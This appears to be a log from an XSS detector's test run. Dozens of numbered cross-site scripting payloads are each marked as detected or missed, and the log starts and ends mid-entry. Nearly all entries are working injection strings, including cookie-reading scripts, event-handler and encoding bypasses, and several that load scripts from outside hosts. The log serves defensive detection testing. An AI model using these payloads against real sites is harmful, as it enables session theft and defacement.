20Chan.%3C/p%3E%3Ch3%3E%97%97%97%3C/h3%3E%3Cp%3EGabinete<br/>%20do%20Chefe%20do%20Executivo,%20aos%2027%20de%20Abril%20de%202004.%20%97%20O%20Chefe%20do%20Gabine<br/>te,%20Ho%20Veng%20On.%3C/p%3E%3Chr%3E%3Ch1%3E%3Ca%20href=
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64151
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: letter=%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3C/h1%3E
+✅ Detected payload: letter=%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3C/h1%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64152
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: ID=3558&dil=TR&page=grup.asp&results="><script>alert(docum<br/>ent.cookie)</script>
+✅ Detected payload: ID=3558&dil=TR&page=grup.asp&results="><script>alert(docum<br/>ent.cookie)</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64153
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: a[]=%3Cscript%20src=http://101hack.freehostia.com/ty.js%3E%3C/script<br/>%3E
+✅ Detected payload: a[]=%3Cscript%20src=http://101hack.freehostia.com/ty.js%3E%3C/script<br/>%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64154
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: action=index&setdate=200703&setday=21%22%3E%27%3E%3C%73%63%72%69%70<br/>%74%3E%61%6C%65%72%74%28%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%36%36%2C%31%32%<br/>31%2C%33%32%2C%31%30%37%2C%31%31%37%2C%31%31%35%2C%31%31%31%2C%31%30%39%2C%31%30%35%2C%31%31%35%2C%3<br/>1%31%31%2C%34%36%2C%39%39%2C%31%31%31%2C%31%30%39%29%29%3C%2F%73%63%72%69%70%74%3E%0A&page=1
+✅ Detected payload: action=index&setdate=200703&setday=21%22%3E%27%3E%3C%73%63%72%69%70<br/>%74%3E%61%6C%65%72%74%28%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%36%36%2C%31%32%<br/>31%2C%33%32%2C%31%30%37%2C%31%31%37%2C%31%31%35%2C%31%31%31%2C%31%30%39%2C%31%30%35%2C%31%31%35%2C%3<br/>1%31%31%2C%34%36%2C%39%39%2C%31%31%31%2C%31%30%39%29%29%3C%2F%73%63%72%69%70%74%3E%0A&page=1
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64155
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: url(sanitized-javascript:alert(&#x27;&#x27;)
+✅ Detected payload: url(javascript:alert('')
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64156
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: codigo=1154&tipo=%22%3E%3Cscript%3Ealert(/xssed!/);<br/>%3C/script%3E
+✅ Detected payload: codigo=1154&tipo=%22%3E%3Cscript%3Ealert(/xssed!/);<br/>%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64157
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: wiki=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%2&lt;br/&gt;7;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%&lt;br/&gt;22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28S&lt;br/&gt;tring.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E&tlimit=7884000%27;alert%28String.fromCharCode%2888,&lt;br/&gt;83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888&lt;br/&gt;,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSC&lt;br/&gt;RIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E
+✅ Detected payload: wiki=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%2<br/>7;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%<br/>22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28S<br/>tring.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E&tlimit=7884000%27;alert%28String.fromCharCode%2888,<br/>83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888<br/>,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSC<br/>RIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64158
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: lid=20071123194608&langue2=fr&email=%3Cscript%3Ealert%281337%29%<br/>3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E&action=subscribe&submit=<br/>OK
+✅ Detected payload: lid=20071123194608&langue2=fr&email=%3Cscript%3Ealert%281337%29%<br/>3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E&action=subscribe&submit=<br/>OK
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64159
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: jobid=%3Cscript%3Ealert(document.cookie);%3<br/>C/script%3E
+✅ Detected payload: jobid=%3Cscript%3Ealert(document.cookie);%3<br/>C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64160
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: form_submit=forgot_email&mod_id=6&forg<br/>ot_email=%22%3E%3Cscript+src%3Dhttp://ckers.org/s%3E%3C%2Fscript%3E
+✅ Detected payload: form_submit=forgot_email&mod_id=6&forg<br/>ot_email=%22%3E%3Cscript+src%3Dhttp://ckers.org/s%3E%3C%2Fscript%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64161
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <input3 onpointercancel=alert(1)>XSS</input3>
+✅ Detected payload: <input3 onpointercancel=alert(1)>XSS</input3>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64162
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: find=%3Cscript%3Ealert(123)%3C%2Fscript%3E&categorie=1
+✅ Detected payload: find=%3Cscript%3Ealert(123)%3C%2Fscript%3E&categorie=1
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64163
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: Field=Title&BigClassName=%3Cscript%3Ealert(%22XSS%22)%3C/script<br/>%3E&SmallClassName=&keyword=XSS&Submit=%CB%D1%CB%F7
+✅ Detected payload: Field=Title&BigClassName=%3Cscript%3Ealert(%22XSS%22)%3C/script<br/>%3E&SmallClassName=&keyword=XSS&Submit=%CB%D1%CB%F7
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64164
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: &lt;form&gt;&lt;button formaction=&quot;sanitized-javascript:alert(123)&quot;&gt;crosssitespt
+✅ Detected payload: <form><button formaction="javascript:alert(123)">crosssitespt
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64165
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: keyword=%22%3E%3Cscript%3Ealert(420)%3C/script%3E&Submit=Go
+✅ Detected payload: keyword=%22%3E%3Cscript%3Ealert(420)%3C/script%3E&Submit=Go
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64166
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: &gt;&quot;&lt;br size=&quot;&{document.cookie=true}&quot;&gt;
+✅ Detected payload: >"<br size="&{document.cookie=true}">
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64167
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <big onbeforepaste="alert(1)" contenteditable>AnonKryptiQuz</big>
+✅ Detected payload: <big onbeforepaste="alert(1)" contenteditable>AnonKryptiQuz</big>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64168
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: UserName=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+✅ Detected payload: UserName=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64169
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <video oncontextmenu="alert(1)">AnonKryptiQuz</video>
+✅ Detected payload: <video oncontextmenu="alert(1)">AnonKryptiQuz</video>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64170
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: "&gt;&lt;img src=x onerror=prompt(document.domain);&gt;
+✅ Detected payload: "&gt;&lt;img src=x onerror=prompt(document.domain);&gt;
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64171
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <frame onpointermove=alert(1)>XSS</frame>
+✅ Detected payload: <frame onpointermove=alert(1)>XSS</frame>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64172
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: acesso=&origem="><script>alert(document.co<br/>okie)</script>
+✅ Detected payload: acesso=&origem="><script>alert(document.co<br/>okie)</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64173
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <video onwebkitmouseforcewillbegin=alert(1)>XSS</video>
+✅ Detected payload: <video onwebkitmouseforcewillbegin=alert(1)>XSS</video>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64174
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: m=%3C%22%3C%3CsCrIpT%3Ealert(1337)%3C/sCrIpT%3E
+✅ Detected payload: m=%3C%22%3C%3CsCrIpT%3Ealert(1337)%3C/sCrIpT%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64175
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: fld=akireflex&url=http://www.xssed.com
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64176
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: trampstelle[startort]="><script>alert(1)</script>
+✅ Detected payload: trampstelle[startort]="><script>alert(1)</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64177
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <keygen oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+✅ Detected payload: <keygen oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64178
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: dizgi=puan&tur=>"><ScRiPt%20%0a%0d>alert(39627,5526048843)%3<br/>B</ScRiPt> HTTP
+✅ Detected payload: dizgi=puan&tur=>"><ScRiPt%20%0a%0d>alert(39627,5526048843)%3<br/>B</ScRiPt> HTTP
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64179
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: div=results&base=1&tire_mark=Nokian&tire_model=%22%3cscript%3<br/>ealert(%22Found%20by%20Hotpockets%20of%20backslashsecurity.org%22)%3c/script%3e
+✅ Detected payload: div=results&base=1&tire_mark=Nokian&tire_model=%22%3cscript%3<br/>ealert(%22Found%20by%20Hotpockets%20of%20backslashsecurity.org%22)%3c/script%3e
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64180
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <big onpointermove=alert(1)>XSS</big>
+✅ Detected payload: <big onpointermove=alert(1)>XSS</big>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64181
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: q=%22%3E%3Cscript%3Ealert(123)%3C/script%3E&Submit=S%F6k
+✅ Detected payload: q=%22%3E%3Cscript%3Ealert(123)%3C/script%3E&Submit=S%F6k
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64182
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nav id=x style="position:absolute;" onanimationcancel="alert(1)"></nav>
+✅ Detected payload: <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nav id=x style="position:absolute;" onanimationcancel="alert(1)"></nav>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64183
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: fromWhichPage=vieshome&selectedLanguage=EL'"><scri<br/>pt>alert(document.cookie)</script>
+✅ Detected payload: fromWhichPage=vieshome&selectedLanguage=EL'"><scri<br/>pt>alert(document.cookie)</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64184
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: CMD=CMDAskUserNameFormSubmit&SUPPORTEMAIL=custs<br/>erv%40homesteadsupport.com&USERNAME=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&x=66&y=14
+✅ Detected payload: CMD=CMDAskUserNameFormSubmit&SUPPORTEMAIL=custs<br/>erv%40homesteadsupport.com&USERNAME=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&x=66&y=14
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64185
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: viewkey=fa04aaf37f137a1d9d3e%22%3E%3Cscript+src=http://bycc<br/>c.awardspace.com/js/xssccc.js%3E%3C/script%3E
+✅ Detected payload: viewkey=fa04aaf37f137a1d9d3e%22%3E%3Cscript+src=http://bycc<br/>c.awardspace.com/js/xssccc.js%3E%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64186
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: tag=lycee%27%22%3E%3C/title%3E%3Cscript%3Ealert(<br/>1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E
+✅ Detected payload: tag=lycee%27%22%3E%3C/title%3E%3Cscript%3Ealert(<br/>1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64187
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input4 id=x style="position:absolute;" onanimationcancel="print()"></input4>
+✅ Detected payload: <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input4 id=x style="position:absolute;" onanimationcancel="print()"></input4>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64188
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: anakid=1&anakad=</title><ScRiPt%20%0a%0d>alert(document.co<br/>okie)%3B</ScRiPt>&%DD%FElemleriniz
+✅ Detected payload: anakid=1&anakad=</title><ScRiPt%20%0a%0d>alert(document.co<br/>okie)%3B</ScRiPt>&%DD%FElemleriniz
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64189
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: id=same&page=4"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+✅ Detected payload: id=same&page=4"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64190
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <svg onpointerleave=alert(1)>XSS</svg>
+✅ Detected payload: <svg onpointerleave=alert(1)>XSS</svg>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64191
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: <style>:target {transform: rotate(180deg);}</style><input2 id=x style="transition:transform 2s" ontransitionrun=print()></input2>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64192
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: cx[][][][][][][][][][][][][][][][][][]=%22%3E%3C<br/>script%3Ealert(document.cookie)%3C/script%3E
+✅ Detected payload: cx[][][][][][][][][][][][][][][][][][]=%22%3E%3C<br/>script%3Ealert(document.cookie)%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64193
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <section onpointerout=alert(1)>XSS</section>
+✅ Detected payload: <section onpointerout=alert(1)>XSS</section>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64194
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frame id=x style="position:absolute;" onanimationcancel="print()"></frame>
+✅ Detected payload: <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frame id=x style="position:absolute;" onanimationcancel="print()"></frame>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64195
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <sub draggable="true" ondragstart="alert(1)">test</sub>
+✅ Detected payload: <sub draggable="true" ondragstart="alert(1)">test</sub>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64196
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <noframes oncut="alert(1)" contenteditable>AnonKryptiQuz</noframes>
+✅ Detected payload: <noframes oncut="alert(1)" contenteditable>AnonKryptiQuz</noframes>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64197
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: search=%22%3E%3Cscript%3Ealert%28%27xss<br/>%27%29%3B%3C%2Fscript%3E%3Cimg+src%3D%22
+✅ Detected payload: search=%22%3E%3Cscript%3Ealert%28%27xss<br/>%27%29%3B%3C%2Fscript%3E%3Cimg+src%3D%22
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64198
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: loc=en%5Fus&nf="><script>alert(document.cookie)</<br/>script>><marquee><h1>By+Narcoticxs</h1></marquee>
+✅ Detected payload: loc=en%5Fus&nf="><script>alert(document.cookie)</<br/>script>><marquee><h1>By+Narcoticxs</h1></marquee>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64199
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: arcadeGameId=10141651%22%3E%3C/script%3E%3Cscript%3E<br/>alert(%22Airroxssed%22);%3C/script%3E%3C!--
+✅ Detected payload: arcadeGameId=10141651%22%3E%3C/script%3E%3Cscript%3E<br/>alert(%22Airroxssed%22);%3C/script%3E%3C!--
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64200
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: team=5&sid=42%22%3E%3Ciframe%20width=857%20scrolling=%22auto%22%20hei<br/>ght=655%20src=//cyber-sabotage.org/images/navbar.jpg%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64201
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: t=1&txt=1&ID="><script>alert(123)</script>
+✅ Detected payload: t=1&txt=1&ID="><script>alert(123)</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64202
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <bdi onmouseout="alert(1)" style=display:block>AnonKryptiQuz</bdi>
+✅ Detected payload: <bdi onmouseout="alert(1)" style=display:block>AnonKryptiQuz</bdi>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64203
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <script>alert('xss')</script>
+✅ Detected payload: <script>alert('xss')</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64204
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <span onmouseup="alert(1)">test</span>
+✅ Detected payload: <span onmouseup="alert(1)">test</span>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64205
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <ruby draggable="true" ondragleave="alert(1)">test</ruby>
+✅ Detected payload: <ruby draggable="true" ondragleave="alert(1)">test</ruby>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64206
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <frame onclick="alert(1)">AnonKryptiQuz</frame>
+✅ Detected payload: <frame onclick="alert(1)">AnonKryptiQuz</frame>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64207
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: action=search&uri=%2Findex.html&__locale=en&query=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&pa<br/>ge=1&index=%2Fsites%2Fwheeler&query2=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&startsearch=Searc<br/>h
+✅ Detected payload: action=search&uri=%2Findex.html&__locale=en&query=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&pa<br/>ge=1&index=%2Fsites%2Fwheeler&query2=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&startsearch=Searc<br/>h
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64208
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: &lt;p v-show=&quot;_c.constructor&#x60;alert(1)&#x60;()&quot;&gt;
+✅ Detected payload: <p v-show="_c.constructor`alert(1)`()">
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64209
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: q1=thesaurus}%3C/style%3E%3Cscript%3Ea=eval;b=al&lt;br/&gt;ert;a(b(/XSS/.source));%3C/script%3E%27%22%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/mar&lt;br/&gt;quee%3E}%3C/style%3E%3Cscript%3Ea=eval;b=alert;a(b(/XSS/.source));%3C/script%3E%27%22%3E%3Cmarquee%3&lt;br/&gt;E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E
+✅ Detected payload: q1=thesaurus}%3C/style%3E%3Cscript%3Ea=eval;b=al<br/>ert;a(b(/XSS/.source));%3C/script%3E%27%22%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/mar<br/>quee%3E}%3C/style%3E%3Cscript%3Ea=eval;b=alert;a(b(/XSS/.source));%3C/script%3E%27%22%3E%3Cmarquee%3<br/>E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64210
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: url_share=%22%3E%3C/a%3E%3C/iframe%3E%3Ciframe%20src=http://xssed.<br/>com%3E%3C/iframe%3E%3Cnoscript%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64211
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: forum=1%22%3E%27%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%7<br/>4%28%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%36%36%2C%31%32%31%2C%33%32%2C%31%30<br/>%37%2C%31%31%37%2C%31%31%35%2C%31%31%31%2C%31%30%39%2C%31%30%35%2C%31%31%35%2C%31%31%31%2C%34%36%2C%<br/>39%39%2C%31%31%31%2C%31%30%39%29%29%3C%2F%73%63%72%69%70%74%3E%0A
+✅ Detected payload: forum=1%22%3E%27%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%7<br/>4%28%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%36%36%2C%31%32%31%2C%33%32%2C%31%30<br/>%37%2C%31%31%37%2C%31%31%35%2C%31%31%31%2C%31%30%39%2C%31%30%35%2C%31%31%35%2C%31%31%31%2C%34%36%2C%<br/>39%39%2C%31%31%31%2C%31%30%39%29%29%3C%2F%73%63%72%69%70%74%3E%0A
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64212
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: searched_from=navbar&show_name=%22%3E%3CSCRIPT%3Ealert%28%27XSS_Al<br/>ert%27%29%3C%2FSCRIPT%3E
+✅ Detected payload: searched_from=navbar&show_name=%22%3E%3CSCRIPT%3Ealert%28%27XSS_Al<br/>ert%27%29%3C%2FSCRIPT%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64213
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <hr onbeforecopy="alert(1)" contenteditable>AnonKryptiQuz</hr>
+✅ Detected payload: <hr onbeforecopy="alert(1)" contenteditable>AnonKryptiQuz</hr>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64214
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: newsurl="><script<br/>>alert("MaXWeL")</script>
+✅ Detected payload: newsurl="><script<br/>>alert("MaXWeL")</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64215
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('AnonKryptiQuz');+ADw-/SCRIPT+AD4-
+✅ Detected payload: <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('AnonKryptiQuz');+ADw-/SCRIPT+AD4-
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64216
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+✅ Detected payload: <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64217
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64218
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: inc=cash&nats=4483%3C%22%3E%3Cscript%3Ealert%280x2222%29%3C/script%<br/>3E
+✅ Detected payload: inc=cash&nats=4483%3C%22%3E%3Cscript%3Ealert%280x2222%29%3C/script%<br/>3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64219
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: aolp=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+✅ Detected payload: aolp=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64220
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: <svg/onload​=alert&#x2F;**&#47;(5)>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64221
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <button onkeypress="alert(1)" contenteditable style=display:block>AnonKryptiQuz</button>
+✅ Detected payload: <button onkeypress="alert(1)" contenteditable style=display:block>AnonKryptiQuz</button>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64222
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: articleID=--><script>alert('X')</script>
+✅ Detected payload: articleID=--><script>alert('X')</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64223
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: <XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64224
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: bannerid=4&zoneid=1&s&zoneid=41&source=&dest=http://sey<br/>men.org
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64225
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: pg=search&search=%3CSCRIPT%20SRC=http://ha.ckers.org/xss.js?%3CB%3<br/>E
+✅ Detected payload: pg=search&search=%3CSCRIPT%20SRC=http://ha.ckers.org/xss.js?%3CB%3<br/>E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64226
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <center onmouseenter="alert(1)" style=display:block>AnonKryptiQuz</center>
+✅ Detected payload: <center onmouseenter="alert(1)" style=display:block>AnonKryptiQuz</center>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64227
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: id=%22%3E%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E
+✅ Detected payload: id=%22%3E%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64228
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: search=%22%27%2F%3E%3Cscript%3Ealert%28%27Hello+The+Rat%27%29%3C%2Fscript%3E
+✅ Detected payload: search=%22%27%2F%3E%3Cscript%3Ealert%28%27Hello+The+Rat%27%29%3C%2Fscript%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64229
+pressed
+Handling alerts
